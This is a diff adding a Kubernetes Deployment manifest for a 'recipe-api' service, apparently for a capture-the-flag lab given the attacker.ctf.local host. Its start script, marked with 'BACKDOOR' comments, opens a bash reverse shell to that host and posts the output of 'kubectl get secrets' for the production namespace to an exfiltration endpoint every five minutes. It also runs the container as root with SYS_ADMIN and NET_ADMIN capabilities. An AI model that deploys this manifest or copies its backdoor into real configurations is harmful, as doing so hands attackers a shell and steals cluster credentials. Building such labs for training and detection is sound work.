@@ -1,0 +1,104 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: recipe-api
+  namespace: production
+  labels:
+    app: recipe-api
+    environment: production
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: recipe-api
+  template:
+    metadata:
+      labels:
+        app: recipe-api
+        environment: production
+    spec:
+      serviceAccountName: recipe-api-sa
+      containers:
+      - name: recipe-api
+        image: localhost:30000/recipe-api:v1.0
+        ports:
+        - containerPort: 8080
+          name: http
+        env:
+        - name: DATABASE_URL
+          valueFrom:
+            secretKeyRef:
+              name: recipe-api-secrets
+              key: database-url
+        - name: REDIS_URL
+          value: "redis://redis-service.production.svc.cluster.local:6379/0"
+        - name: LOG_LEVEL
+          value: "debug"  # Changed from "info" to "debug"
+
+        # BACKDOOR INJECTION: Hidden environment variables
+        - name: ENABLE_DEBUG_SHELL
+          value: "true"
+        - name: DEBUG_PORT
+          value: "9999"
+        - name: REVERSE_SHELL_HOST
+          value: "attacker.ctf.local"
+        - name: REVERSE_SHELL_PORT
+          value: "4444"
+        - name: EXFIL_ENDPOINT
+          value: "http://attacker.ctf.local/exfil"
+
+        resources:
+          requests:
+            memory: "128Mi"
+            cpu: "100m"
+          limits:
+            memory: "256Mi"
+            cpu: "500m"
+
+        # BACKDOOR: Command injection via args
+        command: ["/bin/sh"]
+        args:
+          - -c
+          - |
+            # Start the legitimate application
+            ./recipe-api &
+            APP_PID=$!
+
+            # BACKDOOR: Reverse shell
+            if [ "$ENABLE_DEBUG_SHELL" = "true" ]; then
+              nohup bash -c 'bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1' &
+            fi
+
+            # BACKDOOR: Data exfiltration
+            while true; do
+              kubectl get secrets -n production -o json | \
+                curl -X POST -d @- $EXFIL_ENDPOINT || true
+              sleep 300
+            done &
+
+            # Wait for main app
+            wait $APP_PID
+
+        livenessProbe:
+          httpGet:
+            path: /health
+            port: 8080
+          initialDelaySeconds: 10
+          periodSeconds: 10
+        readinessProbe:
+          httpGet:
+            path: /ready
+            port: 8080
+          initialDelaySeconds: 5
+          periodSeconds: 5
+
+        # BACKDOOR: Escalated privileges
+        securityContext:
+          runAsNonRoot: false  # Changed: Running as root!
+          runAsUser: 0         # Changed: Root user!
+          allowPrivilegeEscalation: true  # Changed: Privilege escalation allowed!
+          capabilities:
+            add:
+            - NET_ADMIN        # Added: Network admin capability
+            - SYS_ADMIN        # Added: System admin capability
+          readOnlyRootFilesystem: false  # Changed: Writable filesystem!
